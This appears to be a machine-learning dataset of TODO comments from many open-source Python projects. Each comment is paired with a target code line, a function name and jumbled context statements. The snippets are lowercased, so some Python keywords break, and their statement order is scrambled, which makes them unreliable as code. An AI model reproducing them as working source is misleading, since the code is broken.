# @todo: support for branches </s> fields.append("human_resource.organisation_id$name")	pr_search_ac show_orgs = settings.get_hrm_show_organisation() if show_orgs: name_format = settings.get_pr_name_format() import re
# todo: add this back in once we've merged back the refactored users code </s> user = all_users.first()	testUpdatePhoneNumberFromFormSubmission populate_user_from_commcare_submission(self.sender, self.xform) all_users = CouchUser.view("users/all_users") self.assertEqual(len(user.commcare_accounts),1) self.assertEqual(user.commcare_accounts[0].django_user.username,self.username)
# todo: parameters to add to theme.ini: </s> vidsource = os.path.join(version.datapath(), 'themes', self.themename, \	__init__ self.background = None if videoAvailable: 'menu', 'credits.avi') if os.path.exists(vidSource):
# todo: change internals to use sparse throughout and delete this: </s> if issparse(l):	predict_proba def predict_proba(self, L): L = L.todense() self._set_constants(L)
# todo: re-enable for hardware </s> for portno, config in list(interfaces_config.items()):	add_dp name, dp_config, port, interfaces_config, i, dpid_count, stack, n_tagged, tagged_vid, n_untagged, untagged_vid) stack = config.get('stack', None) if stack:
# todo: waiting for a fix: https://developer.blender.org/t53509 </s> mat = obj	get_from_context if obj and obj.type not in {"LAMP", "CAMERA"}: mat = obj.active_material if mat: node_tree = mat.luxcore.node_tree
# todo: try testing this </s> if 'error' in ret and 'code' in ret['error'] and ret['error']['code'] == 'request_token_expired':	get if r.status_code != requests.codes.ok: ret = request.json() raise AuthError(ret) else: raise ProtocolError(ret)
# todo put this in a .extra w/a subselect </s> if not hasattr(self, '_hours_worked'):	hours_worked @property def hours_worked(self): self._hours_worked = Entry.objects.filter( user=self.contact.user,
if path.endswith('/index'):  # todo: remove in v8 </s> utils.logger.warn("tags_index_path for language {0} is missing a .html extension. please update your configuration!".format(lang))	get_overview_path if self.site.config['TAGS_INDEX_PATH'](lang): path = self.site.config['TAGS_INDEX_PATH'](lang) path += '.html' return [_f for _f in [path] if _f], 'never'
# todo more_itertools? </s> matching = list(get_takeouts(path=path))	get_last_takeout def get_last_takeout(*, path: Optional[str]=None) -> Path: return matching[-1]
# todo: remove when unicode vlens implemented </s> if isinstance(tid, h5t.typestringid) and tid.get_cset() == h5t.cset_utf8 and attr.shape == ():	__getitem__ attr = h5a.open(self._id, self._e(name)) tid = attr.get_type() unicode_hack = True else:
# todo security </s> def new_facet(request):	new_facet result = {'status': -1, 'message': 'Error'} try:
# note/todo: fixed (realpath) path should go. inner logic has to adapt to </s> status2_full = db.get(realpath(filepath2))	_test_AnnexDB set_db_status_from_file(filep2) status2 = db.get(filep2) assert_equal(status2, status2_full)
# todo 对接 </s> users, items, scores = result	get_result_pairs def get_result_pairs(self, result): return users, items, scores
# todo: handle shortcuts </s> pass	_clear_ui_settings window.remove_accel_group(page.action_group.shortcuts) else:
arch = 'x86_64-linux-gnu' # todo figure this out </s> envs = self.ubuntu.env(root)	env def env(self, root): envs.extend([ "MIR_SOCKET=/run/mir_socket",
# todo: use pybossa uploader! only for debugging: </s> open('/tmp/%d_%s_task_run_json.zip' % (app.id, name), 'wb').write(memzip.getvalue())	export_json memfile.write(str(line)) memzip = make_onefile_memzip(memfile, '%s_task_run.json' % name)
# todo: can remove this skip once cupy/cupy/#2330 is merged </s> return array	test_pad_default if (xp.dtype(dtype).kind in ['i', 'u'] and self.mode in ['mean', 'linear_ramp']): def f(): return xp.pad(array, self.pad_width, mode=self.mode)
# todo: could be more precise by only looking the inames' attributes </s> or (self.kernel.inames != kernel.inames)):	with_kernel if ((self.kernel.instructions != kernel.instructions) or (self.kernel.schedule != kernel.schedule) return make_codegen_cache_manager(kernel) return self
# todo: implement in all datasets. </s> train_set   = dataset.read_data("train")	train def train(self, dataset): idx_to_word = dataset.idx_to_word() sentences = [source_ids for source_ids, _ in train_set] embed_outputs, sequence_lengths = self._embed_inputs(sentences)
print(err) # todo show that message in an empty window </s> return true	_get_valid_file return gfile else:
# todo checks for being not outside of this repository </s> out.append(	is_under_annex for f in files: filepath = opj(self.path, f) islink(filepath) and '.git/annex/objects' in realpath(filepath) )
pass # todo </s> def handle_request(self, input):	handle_request
# todo: this is untested. </s> _raise_current_error()	get_client_ca_list copy = _lib.X509_NAME_dup(name) if copy == _ffi.NULL: pyname = X509Name.__new__(X509Name) pyname._name = _ffi.gc(copy, _lib.X509_NAME_free)
singleton=false,  # todo: re-enable </s> )	pillars tag='pillar', pack=pack, return FilterDictWrapper(ret, '.ext_pillar')
# todo(b/161529310): we flatten and convert the trainable specs to </s> return tf.constant(0), reconstruction_optimizer.initialize(	initial_state_reconstruction_reduce lambda v: tf.TensorSpec(v.shape, v.dtype), local_model_weights.trainable) _flat_tuple(trainable_tensor_specs))
# todo: remove the paired-end specific plots when all report datasets are single end </s> pconfig = {	adapter_removal_length_dist_plot def adapter_removal_length_dist_plot(self): 'title': 'Length Distribution', 'id': 'ar_length_count_plot',
#todo: write doc </s> :param path:	securepath def securepath(path):  #TODO: this is totally not error-handled! :return: if not os.path.exists(path):
# todo: this will incorporated in the future, if needed. </s> edge_starts = []	specify_internal_edge_starts )) elif self.net_params.additional_params["on_ramp"]: else: edge_starts = []
# todo: some kind of value escape </s> return ",".join(["%s=%s" % kv for kv in zip(self.keys, values)])	_render_key def _render_key(self, values):
# todo: this is crazy fragile, indicates we want to refactor </s> if args[0] == 'test -e "$(echo /etc/fedora-release)"':	fedora_exists def fedora_exists(*args, **kwargs): return Result(connection=cxn, exited=0) return Result(connection=cxn, exited=1)
raise notimplementederror # the below does most probably not work anymore todo </s> base = none	diff TESTS:: TODO if base == "dependencies": branch = self.git.current_branch()
# todo: move to middleware </s> if block_identifier is none:	estimateGas if 'from' not in transaction and is_checksum_address(self.defaultAccount): transaction = assoc(transaction, 'from', self.defaultAccount) return self.web3.manager.request_blocking( "eth_estimateGas",
# todo write me </s> pass	_response headers.append(('Access-Control-Allow-Origin', allowed_origin)) if max_cache_age is not None: start_response(code, headers) return [content]
# todo: use the kinetic scroller if implemented </s> self.startscrolling(qpoint(dx, dy))	scrollForDragging if dy >= 0: dy = max(0, pos.y() - viewport.bottom() + 12)
# todo: better strategy here? </s> for k in into:	separate out = pd.concat([___data, keep_splits], axis = 1) if convert: try: out[k] = pd.to_numeric(out[k])
# todo: invalidate cache for former latestappinfo </s> self.expire_cache(self.domain)	save def save(self, *args, **kwargs): super(LatestEnabledBuildProfiles, self).save(*args, **kwargs)
# todo move to glyf or gvar table proper </s> fvar.instances.append(inst)	_add_fvar inst.coordinates = coordinates
assert oldsize == self.size, '%s: %d, %d' % (self.type, oldsize, self.size) # todo: remove </s> return self.size	stsc_atom oldsize = self.size # TODO: remove self.size = 8 + 4 + 4 + len(self.body[1]) * 12
#todo: remove convert_bare true and deprecate this in with_ </s> loop_terms = listify_lookup_plugin_terms(terms=self._task.loop_args, templar=templar, loader=self._loader, fail_on_undefined=true, convert_bare=true)	_get_loop_items if self._task.loop: if self._task.loop in self._shared_loader_obj.lookup_loader: items = self._shared_loader_obj.lookup_loader.get(self._task.loop, loader=self._loader, templar=templar).run(terms=loop_terms, variables=vars_copy) else:
# todo: write out full expression for general rhs of the form </s> _, f = self.broken_rhs.split()	apply self.ksp.solve(b, x) sigma_h, u_h = self.broken_solution.split() M = self.B * self.A.inv * self.B.T + self.C u_sol = M.inv * f + M.inv * (self.B * self.A.inv *
# update new ratings kodi 17 - todo get ratingid for updates from embydb </s> if self.kodi_version > 16:	add_updateEpisode self.kodi_db.update_file(tempfileid, filename, temppathid, dateadded) self.kodi_db.add_playstate(tempfileid, resume, total, playcount, dateplayed) ratingid =  self.kodi_db.create_entry_rating() self.kodi_db.add_ratings(ratingid, showid, "episode", "default", rating, votecount)
# todo: handle this </s> print "[papyon]", contact, "joined a conversation"	on_conversation_user_joined def on_conversation_user_joined(self, contact):
# todo: shouldn't have to concretize here.  fix dag issues. </s> specs = spack.cmd.parse_specs(args.spec, concretize=true)	deactivate def deactivate(parser, args): if len(specs) != 1: tty.die("deactivate requires one spec.  %d given." % len(specs))
# todo: commented until i find a way to make it store only episodes really updated. </s> for added_episode in episodes_to_add:	sync_episodes db.commit() c.close() store_subtitles(path_replace(added_episode[3])) logging.debug('BAZARR All episodes synced from Sonarr into database.')
# todo: update the tolerance after the ci moves to torch 1.10 </s> self.asserttrue(torch.allclose(outputs.logits[:, :4], expected_logits, atol=1e-2))	test_inference_diarization self.assertEqual(labels[0, :, 0].sum(), 270) self.assertEqual(labels[0, :, 1].sum(), 647)
# todo: support botorch v0.4.0. see: https://github.com/optuna/optuna/issues/2381 </s> "botorch<0.4.0 ; python_version>'3.6'",	get_extras_require "torchaudio==0.7.2", "allennlp<2.0.0", "fastai", ],
pass # todo </s> def handle_request(self, input):	handle_request
# todo add assertions </s> p = poll.objects.get()	test_update self.poll.question = "yours" self.poll.save() self.assertEqual(p.question, "yours")
# todo: why does resourcefilecache return none in some cases? </s> name = self.datafile.replace_variables(name)	get_keywords kws.extend(LIBRARYCACHE.get_library_keywords(name, args)) for name in self.get_resource_imports(): res= RESOURCEFILECACHE.get_resource_file(self.datafile.source, name)
# todo username </s> sudo = args.pushy('ssh+sudo:{hostname}'.format(	disk_list def disk_list(args, cfg): for hostname, disk, journal in args.disk: hostname=hostname, ))
# todo: make the buffer longer and arrange so partial updates rather than the entire buffer can be sent to clients. </s> self.__text = textstring[-100:]	get_text textstring = self.__text textstring += message.to_string().decode('us-ascii') return self.__text
#todo: orgdatetime is not implemented yet </s> self.assertequal(odate, h.active_date)	test_heading_parsing_with_date h = Heading.parse_heading_from_data(text, self.allowed_todo_states)
1  # todo: fill in identifier </s> )	test_automatic_dispute direct_transfer = channel0.create_directtransfer( amount_alice1, direct_transfer.sign(privatekey0, address0) channel0.register_transfer(direct_transfer)
# todo could do smarter matching of results to trials if we have extras </s> for env_id in benchmark.env_ids:	benchmark_aggregate_score start_times = [] end_times = [] task_list = benchmark.task_specs(env_id) num_trials = task_list[0].trials
# todo: handle cpu time differences, where "e" comes before "b" </s> def trace_event_read_offsets(profile):	trace_event_read_offsets root_slices = [] events = {}
# todo: allow setting a placeholder dom element, or any widget parent </s> this.node = document.createelement('button')	Button @js def _js_init(self): flexx.get('body').appendChild(this.node); this.node.innerHTML = 'Look, a button!'
# todo need to ditch this requirement </s> if not validate_handle(self.handle):	save if not self.guid: raise ValueError("Profile must have a guid!") raise ValueError("Not a valid handle") if not self.image_url_small or not self.image_url_medium or not self.image_url_large:
# todo this should be fixed in pandas 0.18.2 </s> if pd.__version__ == '0.18.0':	test_info from io import StringIO from dask.compatibility import unicode from pandas.core import format else:
# todo: update tests instead? </s> vt.erased = true	fast_container_type if not isinstance(vt, Instance): return None return self.chk.named_generic_type(container_fullname, [vt])
# todo: raise error </s> return	handle_additional_actions payment = Payment.objects.filter(pk=payment_pk).first() if not payment: data = json.loads(payment.extra_data) return_url = payment.return_url
# todo this is a temporary hack python-136 is the right solution for this </s> return self.__slaves	slaves def slaves(self):
# todo: kwargs </s> def _impl(df, periods=1, fill_method='pad', limit=none, freq=none):	pct_change_overload @overload_method(DataFrameType, 'pct_change') def pct_change_overload(df, periods=1, fill_method='pad', limit=None, freq=None): return hpat.hiframes.pd_dataframe_ext.pct_change_dummy(df, periods) return _impl
#todo fifechan / fife 0.3.5+ compat </s> self._setting.showsettingsdialog()	show_settings self._settings_extra_inited = True if hasattr(self._setting, 'showSettingsDialog'): else: self._setting.onOptionsPress()
#ng_required="true",    # todo: validation </s> data_bind="value: password, valueupdate: 'input'",	NewMobileWorkerForm crispy.Field( 'password', ), )
# todo remove this sleep to reproduce http://tracker.ceph.com/issues/8107 </s> import time	test_create_args self._create(cluster_id, pool_name, pg_num=64, optionals=optionals) pool_id = self._assert_visible(cluster_id, pool_name)['id'] time.sleep(20) pool = self.api.get("cluster/%s/pool/%s" % (cluster_id, pool_id)).json()
# todo ... </s> if isinstance(token, cclosingbracket):	cpre3_parse curCObj = _CBaseWithOptBody(parent=parent) elif state == 11: # bracket in typedef if token.brackets == curCObj._bracketlevel: state = 10
# todo: only devnet for now </s> eth_node = no_blockchain_connection.bool_value(false)	felix if not click_config.quiet: click.secho(FELIX_BANNER.format(checksum_address or '')) if geth: ETH_NODE = NuCypherGethDevnetProcess(config_root=config_root)
## \todo: remove nodegraph fallback when all client code has been updated </s> if not gaffer.metadata.value( node, "grapheditor:childrenviewable" ) and not gaffer.metadata.value( node, "nodegraph:childrenviewable" ) :	appendContentsMenuDefinitions @classmethod def appendContentsMenuDefinitions( cls, graphEditor, node, menuDefinition ) : return menuDefinition.append( "/ContentsDivider", { "divider" : True } )
#todo: am i supposed to be adding the namespace like this? </s> data_node.append(etree.element(ns+tag))	handle ns = "{%s}" % data_node.nsmap[None] tag = hidden_value_path.replace("/data/", "") ns = "{%s}" % xform_root.nsmap[None] itext_node = xform_root[0][1].find(ns+"itext")
# todo make the colors randomly generated from rgb values </s> colors = ['b', 'g', 'r', 'c', 'm', 'y', 'k']	roc_plot_from_predictions def roc_plot_from_predictions(y_test, y_predictions_by_model, save=False, debug=False): plt.figure() plt.xlabel('False Positive Rate')
# todo check error message here </s> assert response.status_code == 400	test_relationship_missing_data response = self.app.patch('/api/article/1', data=dumps(data))
for obj in bpy.data.objects: #todo: this is not the best list to iterate over (there might be multiple scenes) </s> if getroot(obj) == root:	getChildren def getChildren(root): children = [] children.append(obj) return children
for c in spinner():  # todo change to yield from, when dropping python 2.7 </s> yield c	inner_play def inner_play(): while True:
# todo: fix up internal access (again)! </s> self._parent.value = self._parent.value.replace(day=self._days.value,	_DatePickerPopup if event is None: try: month=self._months.value, year=self._years.value)
# todo: remove "get_" from the name </s> return the type of the edge as a triple of	get_edge_type def get_edge_type(self, edge, index=False): (source_node_type, relation_type, dest_node_type). The edge is specified as a standard NetworkX multigraph edge
# todo: do we need to skip config.add_slack variable here? </s> var_filter = (lambda v: (v[1].is_integer() if discrete_only else true) and	generate_norm1_objective_function discrete_only: Bool only optimize on distance between the discrete variables v[1].name != 'MindtPy_utils.objective_value' and 'MindtPy_utils.MindtPy_feas.slack_var' not in v[1].name)
# todo implement </s> pass	get_gradients def get_gradients(model, inputs, outputs):
# todo assert responses, swipe down </s> tx = self.client.nem_sign_tx(self.client.expand_path("m/44'/1'/0'/0'/0'"), {	test_nem_signtx_mosaic_creation self.setup_mnemonic_nopin_nopassphrase() with self.client: "timeStamp": 74649215, "fee": 2000000,
# todo: заменить на простой json # ld load_resources </s> import sublime	read_file_dictionary import os try: hayaku_dict = sublime.load_settings(CSS_DICT_FILENAME) if hayaku_dict is None:
# todo: make an ascii-art bar </s> ctx.fillslots("progress", "%.1f%%" % (100.0 * progress))	render_row_download self._render_common(ctx, data) progress = data.get_progress() return ctx.tag
# todo extend to nonbinary nodes </s> max_ent_shape = [2 if node in self.nodes else 1	max_entropy_distribution different from the network's uniform distribution because nodes outside the purview are fixed and treated as if they have only 1 state). for node in self.network.nodes] return np.divide(np.ones(max_ent_shape),
# todo: this test should fail for now but should succeed once </s> params = net_fit.get_params()	test_get_params_no_learned_params @pytest.mark.xfail(strict=True) def test_get_params_no_learned_params(self, net_fit): params_learned = set(filter(lambda x: x.endswith('_'), params)) assert not params_learned
# todo: use pybossa uploader! only for debugging: </s> open('/tmp/%d_%s_task_csv.zip' % (app.id, name), 'wb').write(memzip.getvalue())	export_csv memfile.write(str(line)) memzip = make_onefile_memzip(memfile, '%s_task.csv' % name) csv_task_run_generator = respond_csv("task_run", app.id) if csv_task_run_generator is not None:
# todo should this even include public_ip if it's always none? </s> assert dump["public_ip"] is none	test_dump_collects_events assert dump["dst_port"] == destination_port assert dump["local"] == (destination_ip, destination_port)
## todo: raise an exception? </s> pass	_communicate elif isinstance(resp, AckMessage): if not resp.header.get('ok'): s.close()
# xxx todo: rounding </s> e = []	fcvt def fcvt(ir, instr, arg1, arg2): src = ExprOp('fpconvert_fp%d' % arg1.size, arg2) e.append(ExprAssign(arg1, src))
# todo: reflection padding </s> conv = tf.nn.conv2d(input, weights,	dk biases = tf.get_variable("biases", [k], initializer=tf.constant_initializer(0.0)) strides=[1, 2, 2, 1], padding='SAME') bn = batch_norm(conv+biases, is_training)
# todo: see https://github.com/mozilla/openwpm/issues/867 for when </s> prefs = configure_firefox.load_existing_prefs(browser_profile_path)	start_webdriver fo.add_argument("-profile") fo.add_argument(str(browser_profile_path)) prefs.update(configure_firefox.DEFAULT_GECKODRIVER_PREFS) if with_extension:
# todo: arrange </s> repo = self.remote.new_repo(self.token)	test_create_repo def test_create_repo(self): Test: create/edit a repo object self.assertTrue(self.remote.modify_repo(repo, "name", "testrepo0", self.token)) self.assertTrue(self.remote.modify_repo(repo, "mirror", "http://www.sample.com/path/to/some/repo", self.token))
# todo: backend tensorflow </s> if backend_name == "tensorflow.compat.v1":	state_dict def state_dict(self): destination = OrderedDict() variables_names = [v.name for v in tf.global_variables()]
##? value()  --- todo fix support for tuple assignment </s> value	mapping for key, value in t: key
# todo i think this is a hack. it should be an </s> c = er.wrap(self._evaluator, c.parent).name	completions or n.startswith(like): if isinstance(c.parent, (pr.Function, pr.Class)): new = classes.Completion(self._evaluator, c, needs_dot, len(like)) k = (new.name, new.complete)  # key
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_comparison def test_comparison(self):
#todo: the static files should handle collection of their static folder on their own </s> self._static = none	_rebuild self.listener.pause() try: self.build() except Exception, e:
# todo: implement fixture after moto is ready </s> boto3.set_stream_logger()	emr @pytest.yield_fixture(scope='function') def emr(): mock = mock_emr() mock.start()
# todo: after https://github.com/multiagentlearning/playground/pull/40 </s> agents = [	run agent_env_vars = args.agent_env_vars game_state_file = args.game_state_file helpers._make_agent_from_string(agent_string, agent_id+1000) for agent_id, agent_string in enumerate(args.agents.split(','))
# todo: save state right here </s> [returnfromkernel(kernel_name=new_kernel_name)])	inner_mapper [CallKernel(kernel_name=new_kernel_name)] + current_chunk + new_schedule.extend( [start_item] +
# todo: fix </s> start_id = -1	_generate_latest def _generate_latest(url, django_model): received_count = django_model.objects.count() if url.find("?") == -1: url = url + "?"
else: self.assertequal(end, 1) # todo: simple exec should not wait_testpid!! </s> top = _recent(output(_top_list))	test_3901_start_false_exec_simple logg.info(" %s =>%s\n%s\n%s", cmd, end, out, i2(err)) if real: self.assertEqual(end, 0) logg.info("\n>>>\n%s", top) self.assertFalse(greps(top, testsleep))
#   todo:   2012-11-07 14:05:42 by brian mcfee <brm2132@columbia.edu> </s> result = scipy.signal.fftconvolve(x, x[::-1], mode='full')	autocorrelate Output: z:          x's autocorrelation (up to max_size if given) result = result[len(result)/2:] if max_size is None:
assert study_id == 0  # todo </s> self.trials[trial_id].params[param_name] = value	report_param def report_param(self, study_id, trial_id, param_name, value):
#todo - files </s> curl_cmd = 'curl -l '	curl @property def curl(self): header = '' if self.headers:
# todo: lamp texture test.. </s> if n.inputs[0].is_linked:	export_lamp elif o['type'] == 'sun': o['strength'] *= 0.4 color_node = n.inputs[0].links[0].from_node if color_node.type == 'TEX_IMAGE':
# todo: could use -xlinker here, if it's supported </s> assert "," not in dir	runtime_library_dir_option if sys.platform[:3] == 'aix' or sys.platform == 'win32': raise NotImplementedError sep = ',' if sys.platform == 'darwin' else '=' return '-Wl,-rpath%s%s' % (sep, dir)
#todo: check cost line </s> coast_tile_found = false	is_ground_build_requirement_satisfied @classmethod def is_ground_build_requirement_satisfied(cls, x, y, island, **state): for xx, yy in [ (xx, yy) for xx in xrange(x, x + cls.size[0]) for yy in xrange(y, y + cls.size[1]) ]: tile = island.get_tile(Point(xx, yy))
# todo: implement this </s> class opts(object):	Opts def __init__(s): s.format_map = self.FORMATS
# todo(py3.7): add required=true </s> p_operation = parser.add_subparsers(dest="operation", metavar="operation")	add_interact_arguments @classmethod def add_interact_arguments(cls, parser): p_convert = p_operation.add_parser( "convert", help="convert VGM to PCM using OPL hardware")
# time.sleep(40)  # todo: should remove after polling get. </s> exp_res = op(data_1, data_2)	test_tensor_abstraction_pointer mpc_1_2_3 = op(mpc_1_2, tensor_pointer_3) mpc_1_2_3.block_with_timeout(secs=40) assert (mpc_1_2.reconstruct() == exp_res.child).all() exp_res = op(exp_res, data_3)
# todo: align series </s> return geoseries([s[0].difference(s[1]) for s in zip(self, other)],	difference Operates on either a GeoSeries or a Shapely geometry if isinstance(other, GeoSeries): index=self.index) else:
# now we can kill it. todo: on a slow machine, the node might kill </s> def _stop(res):	test_client d.addCallback(_started) d.addCallback(lambda res: self.poll(_node_has_started)) open(HOTLINE_FILE, "w").write("") self.failUnless(os.path.exists(TWISTD_PID_FILE))
# todo: remove in conan 2.0 </s> @pytest.mark.tool_cmake	test_cmake_find_package_multi def test_cmake_find_package_multi(client_weird_lib_name): c = client_weird_lib_name
# todo: write a unit test </s> extend(q, get_subnodes(v))	filter_search yield v
# todo watch out because urllib.unquote will blow up on unicode text </s> msg = self.server.backend.message(session_id, urllib.unquote(text))	do_GET session_id = match.group(1) text = match.group(2) self.server.backend.route(msg) self.send_response(200)
# @todo: deployment_setting </s> organisation_dropdown_not_ac = false	S3OrganisationModel args="create", vars=dict(format="popup")) if organisation_dropdown_not_ac: help = T("If you don't see the Organization in the list, you can add a new one by clicking link 'Add Organization'.")
# todo: progress +kwargs </s> else:	pull GIT_SSH_COMMAND="ssh -S %s" % cnct.ctrl_path): remote.pull(refspec=refspec, progress=progress) remote.pull(refspec=refspec, progress=progress)
# todo delete? we should search for valid parser </s> completion_names += self._simple_complete(completion_parts)	get_completions self._pos, module) return completion_names
return # todo raise error </s> if value == 'none':	set_LoopStatus if not self.get_CanControl(): logger.debug(u'Setting %s.LoopStatus not allowed', PLAYER_IFACE) self.backend.playback.repeat = False self.backend.playback.single = False
# todo - actually figure out types </s> return [{	xlsx_infer_schema sheet = book.get_active_sheet() headers = sheet.iter_rows().next() 'column': h.internal_value, 'type': 'unicode'
# @todo: deprecate </s> ireport_search = s3search(	S3IRSModel ), ] advanced=( S3SearchSimpleWidget(
# todo: move this into generic agentrootcomponent. </s> raise notimplementederror("todo: pytorch support")	_graph_fn__concat elif backend == "pytorch":
# todo: update the tolerance after the ci moves to torch 1.10 </s> self.assertalmostequal(outputs.loss.item(), 18.4154, 2)	test_inference_speaker_verification self.assertAlmostEqual(cosine_sim(embeddings[0], embeddings[1]).item(), 0.5064, 3) self.assertAlmostEqual(cosine_sim(embeddings[2], embeddings[3]).item(), 0.4780, 3)
#todo: register authorities via annotations? </s> @staticmethod	getAuthority def getAuthority(choice): Fetch the authority class based on a type
self.current_width = self.current_width * 2 #todo </s> self.current_height = self.current_height * 2 #todo	layer_subpixel if options.activation != "null": layers.append(nn.ReLU())#TODO self.current_channels = channels self.current_input_size = self.current_channels * self.current_width * self.current_height
# todo integrate param when g is a clustered graph </s> show_edges = g.ne < 10000	_thread def _thread(): if G.coords.shape[1] == 2: fig = plt.figure()
# todo: can just leave this in superclass </s> super().plan()	plan def plan(self):
# todo: https://github.com/pycqa/pylint/issues/3139 </s> num_words = inputs.shape[0]	testCrfLogLikelihood dtype=np.float32) sequence_lengths = np.array(3, dtype=np.int32) num_tags = inputs.shape[1] all_sequence_log_likelihoods = []
# todo allow client to pass in constructor arguments/options </s> assert _manager is not none	get_importer @return: importer associated with content type @raises PluginNotFoundError: if not importer is associated with the content type Importer = _manager.lookup_importer_class(content_type) if importer is None:
# todo nix this when fastparquet resolves </s> self._parquet_file = none	parquet_file self._parquet_file = None except IndexError: return self._parquet_file
# todo: why does a dataset have this? </s> x = x[:, 0]	pdf def pdf(self, X): y = X[:, 1] rval = T.exp(-T.sqr(y - T.cos(x)) / (2. * (self.std ** 2.)))
# xxx todo register a failure handler that reverses the local state </s> return "ok"	copy q = action.get_queue() q.enqueue(action.get_copy_fn(account), thread_id, from_folder, to_folder)
#todo (dwalleck): this is a horrible stopgap. </s> temp = mgmt_url.rsplit('/')	keystone_v2_auth if mgmt_url == None: raise exceptions.EndpointNotFound(service) service_url = temp[0] + '//' + temp[2] + '/' + temp[3] + '/' management_url = service_url + tenant_name
# todo- re-implement this to make an iterator instead of returning a </s> import networkx	breadth_first_search sage: D.depth_first_search(0) [0, 1, 2, 3, 4] return networkx.bfs(self._nxg, u)
# todo find better documentation </s> self.struct = {	__init__ def __init__(self, ql): "Revision": 0x1.to_bytes(length=1, byteorder="little"),  # ADD "SubAuthorityCount": 0x1.to_bytes(length=1, byteorder="little"),
pass    # todo </s> def test_spring_forward(self):	test_spring_forward
# todo: don't write them? is *much* slower on re-load (~3x) </s> try:	update_module fh.flush() os.fsync(fh.fileno())  # flush to disk os.unlink(self.module_path + 'c') except OSError:
# todo ... </s> self.error("preprocessor: if-evaluation not yet implemented; cannot check '" + condstr + "'")	cpreprocess_evaluate_cond def cpreprocess_evaluate_cond(state, condstr): return True # may be more often what we want :P
pass # todo </s> def startentity(self, name):	startEntity
#todo: hardcoded to sigma as the model </s> if getattr(self, '_mfsigmai', none) is none:	MfSigmaI @property def MfSigmaI(self): sigma = self.curModel.transform self._MfSigmaI = self.mesh.getFaceInnerProduct(sigma, invMat=True)
final_arr = []  # todo: uncomment it </s> ftp.cwd(current)	__process_paths final_arr[j] = str(final_arr[j]) + '/' + item else: else: if self.__folder_exist(ftp, item):
# todo todo </s> if uri.type != "s3":	object_put_uri def object_put_uri(self, filename, uri, extra_headers = None): raise ValueError("Expected URI type 's3', got '%s'" % uri.type) return self.object_put(filename, uri.bucket(), uri.object(), extra_headers)
# todo: retry instead? </s> pass	handle_events_job_logs xp_logger.handlers = [] except OSError:
# todo: avoid explicit reference to cupy </s> return "cupy" in str(type(x))	_is_cupy_type def _is_cupy_type(x):
# todo: assert </s> assert 0	test_get_repo_config_for_profile Test: get repository configuration of a profile result = self.remote.get_repo_config_for_profile("testprofile0")
# todo: this can be optimized to one commit/write. </s> alice_pubkey_sig = self.add_key(alice_pubkey_sig, is_signing=true)	add_policy_contract Creates a PolicyContract to the Keystore. :return: The newly added PolicyContract object new_policy_contract = PolicyContract( expiration, deposit, hrac, alice_pubkey_sig.id, kfrag,
# todo: this doesn't return results as often as it should, meaning we end up marking things are more suspicious than they actually are. </s> params = {	cell_search def cell_search(self, lat, lon, gps_offset, cell_id, tac = None): "latrange1": lat + gps_offset, "latrange2": lat - gps_offset,
# todo: add option for attentive reader </s> print('trainable variables (only embeddings): %d' % get_total_trainable_variables())	boe_nosupport_cands_reader_model varscope.reuse_variables() candidates_embedded = nvocab(candidates) question_encoding = tf.reduce_sum(question_embedded, 1) scores = logits = tf.reduce_sum(tf.expand_dims(question_encoding, 1) * candidates_embedded, 2)
# todo: ugly n^2 </s> c.sons = [	comment_list_helper c.level = len(c.path.split('/')) for c in comment_list: i for i in comment_list \ if i.path.startswith(c.path) and i.level == c.level+1
# todo: must be implemented </s> pass	get_novel_url def get_novel_url(self):
# todo(aivanou): t83447589 come up with the proper fix </s> res = self.run_job(node_configs)	test_run_distributed_sum_homogeneous Conf(role="sum", entrypoint=_dist_sum, local_world_size=4), ] self.assertEqual(2, len(res["sum"])) ranks = set()
# todo: skipping time.first() necessary? </s> if t != t0:	test_optimize_dynamic block[t0].deactivate() for t in time: input_vars = [m.h[t], m.dhdt[t], m.flow_in[t]] external_vars = [m.flow_out[t]]
#todo: fix the null space </s> xc = solver(a).solve(rhs)	Test1D_InhomogeneousDirichlet err = np.linalg.norm((q-q_anal), np.inf) elif self.myTest == 'xc': print np.linalg.norm(Utils.mkvc(A*xc) - rhs) err = np.linalg.norm((xc-xc_anal), np.inf)
# todo: do the computation without the 'sr' enforcement </s> mat_expr = matrix([[mat[i,j].expr(method='sr') for i in range(self._nc)]	jacobian_det raise ValueError("the Jacobian matrix is not a square matrix") mat = self.jacobian() for j in range(self._nc)]) det = mat_expr.det() # the unsimplified determinant
# todo: progress +kwargs </s> else:	pull GIT_SSH_COMMAND="ssh -S %s" % cnct.ctrl_path): remote.pull(refspec=refspec, progress=progress) remote.pull(refspec=refspec, progress=progress)
# todo, dot over only 1 dimension </s> a1_all = iam * np.dot(-grad_in_comp(l, m, r1, theta1, phi1), snaug)	sss_basis c_vec = Ipm - np.ones((Np, 1)) * h0_int r1, theta1, phi1 = cart_to_sph(c_vec[:, 0], c_vec[:, 1], c_vec[:, 2]) a1 = np.sum(a1_all, 1)  # XXX Check that this sum is correct A[:, l ** 2 + l + m] = a1  # TODO, inds might be off by 1
# todo: dynamically add/remove adapters </s> self._ports.clear()	_parseResponse self._settings[name] = value log.debug("number of adapters has changed to {}".format(self._settings["adapters"])) self._addAdapters(self._settings["adapters"]) elif name in ["ethernet_adapters", "serial_adapters"] and self._settings[name] != value:
# todo implement test for windows. </s> if not word_count_command:	testMultipleFilterThroughShell def testMultipleFilterThroughShell(self): word_count_command = self.__class__.getWordCountCommand() return True set_text(self.view, '''Beginning of test!
# todo: clean up </s> yield _pubsubs_gsub	pubsubs_gsub _pubsubs_gsub = _make_pubsubs(hosts, gossipsubs, pubsub_cache_size)
# todo: kwargs </s> def _impl(df, periods=1, fill_method='pad', limit=none, freq=none):	pct_change_overload @overload_method(DataFrameType, 'pct_change') def pct_change_overload(df, periods=1, fill_method='pad', limit=None, freq=None): return hpat.hiframes.pd_dataframe_ext.pct_change_dummy(df, periods) return _impl
# todo: remove in 1.2 </s> def fbeta_score(	fbeta_score pred: torch.Tensor, target: torch.Tensor,
# todo: voltage dependency </s> vl = _is_elements["sgen_3ph"] * sg_3ph["scaling"].values.t / np.float64(1000.)	_calc_pq_elements_and_add_on_ppc sg_3ph = net["sgen_3ph"] if len(sg_3ph) > 0: q = np.hstack([q, (sg_3ph["q_kvar_A"].values + sg_3ph["q_kvar_B"].values + sg_3ph["q_kvar_C"].values) * vl]) p = np.hstack([p, (sg_3ph["p_kw_A"].values + sg_3ph["p_kw_B"].values + sg_3ph["p_kw_C"].values) * vl])
